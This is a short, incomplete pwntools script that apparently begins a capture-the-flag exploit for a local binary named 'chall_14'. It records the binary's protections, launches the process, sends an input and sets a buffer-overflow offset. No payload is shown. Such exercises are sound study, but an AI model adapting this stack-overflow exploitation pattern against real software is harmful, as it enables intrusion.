from pwn import *

# No PIE, Canary, NX enabled, Partial RELRO

p = process("chall_14")
elf = ELF("chall_14")

p.sendline("swag")

offset = 0x60 + 0x8